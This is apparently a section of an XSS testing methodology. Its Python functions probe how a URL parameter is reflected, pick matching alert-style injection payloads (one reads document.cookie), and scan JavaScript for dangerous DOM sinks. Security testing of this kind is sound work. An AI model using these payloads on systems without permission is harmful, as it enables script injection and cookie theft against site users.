# Deep Technical Procedures

## Context Detection

```python
import requests
from bs4 import BeautifulSoup
import re

def detect_xss_context(url, param):
    """Analyze how input is reflected to determine XSS context"""
    test_value = "X5ST3ST"
    resp = requests.get(url, params={param: test_value})
    soup = BeautifulSoup(resp.text, 'html.parser')

    contexts = []
    if test_value in resp.text:
        position = resp.text.index(test_value)
        surrounding = resp.text[max(0,position-50):position+len(test_value)+50]
        
        if f'>{test_value}' in surrounding or f'>{test_value}' in surrounding:
            contexts.append('html_tag_content')
        elif f'="{test_value}"' in surrounding or f"='{test_value}'" in surrounding:
            contexts.append('attribute_value')
        elif f'<script>' in surrounding or 'var ' in surrounding:
            contexts.append('javascript_context')
            
    return contexts

def craft_payload(context_type):
    payloads = {
        'html_tag_content': '<img src=x onerror=alert(document.cookie)>',
        'attribute_value': '" onfocus="alert(1)" autofocus="',
        'javascript_context': "';alert(1);//",
        'css_context': '</style><script>alert(1)</script>'
    }
    return payloads.get(context_type, '<script>alert(1)</script>')
```

## DOM-based XSS Sink Detection

```python
import re

DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    'eval', 'setTimeout', 'setInterval', 'Function',
    'location', 'location.href', 'location.replace', 'location.assign',
    'srcdoc', 'createContextualFragment', 'jQuery.html', '$()'
]

def scan_dom_sinks(js_code):
    findings = []
    for sink in DOM_SINKS:
        matches = re.finditer(rf'[.\s]+{sink}\s*[=:(]', js_code)
        for match in matches:
            line_start = max(0, match.start() - 100)
            context = js_code[line_start:match.end() + 100]
            findings.append({
                'sink': sink,
                'position': match.start(),
                'context': context
            })
    return findings
```
